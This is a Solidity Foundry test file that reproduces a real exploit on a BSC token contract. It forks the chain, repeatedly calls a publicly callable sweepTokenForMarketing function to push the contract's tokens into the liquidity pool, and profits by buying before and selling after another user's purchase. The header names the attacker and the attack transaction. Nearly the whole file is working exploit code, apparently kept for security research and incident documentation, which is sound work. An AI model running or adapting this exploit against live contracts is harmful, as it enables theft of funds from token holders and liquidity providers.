// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~0.2 $BNB
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0x132e1ea5db918dae00eef685b845c409a83dfa82
// Vulnerable Contract : https://bscscan.com/address/0xe56842ed550ff2794f010738554db45e60730371
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/bsc/0x1999bb5c11a8d8bfa7620fc5cc37f5bc59c1a99d7a9250a8d6076c93bbdbeb5f

import "forge-std/Test.sol";
import "./../interface.sol";


interface IBIN_WBNB {}

interface IBIN is IERC20 {
    function sweepTokenForMarketing() external;
}

contract ContractTest is Test {

    IBIN BIN = IBIN(address(0xe56842Ed550Ff2794F010738554db45E60730371));
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address otherUser = 0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4;

    function setUp() public {
        vm.createSelectFork("bsc", 36_864_395 - 1);
        vm.label(address(Router), "Router");
        vm.label(address(BIN), "BIN");
        vm.label(address(WBNB), "WBNB");
    }

    function testExploit() public {
        WBNB.approve(address(Router), type(uint256).max);
        BIN.approve(address(Router), type(uint256).max);
        deal(address(WBNB), address(this), 1 ether);
        deal(address(WBNB), address(otherUser), 10 ether);
        emit log_named_decimal_uint("Attacker WBNB balance before attack:", WBNB.balanceOf(address(this)), 18);
        while (BIN.balanceOf(address(BIN)) > 1_000_000_000_000_000_000_000_000) {
            BIN.sweepTokenForMarketing();
        }
        WBNBTOTOKEN();

        // Wait for other users to buy in
        vm.startPrank(address(otherUser));
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BIN);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(otherUser)), 0, path, address(otherUser), block.timestamp
        );
        vm.stopPrank();

        TOKENTOWBNB();
        emit log_named_decimal_uint("Attacker WBNB balance before attack:", WBNB.balanceOf(address(this)), 18);
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BIN);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BIN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function WBNBTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BIN);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
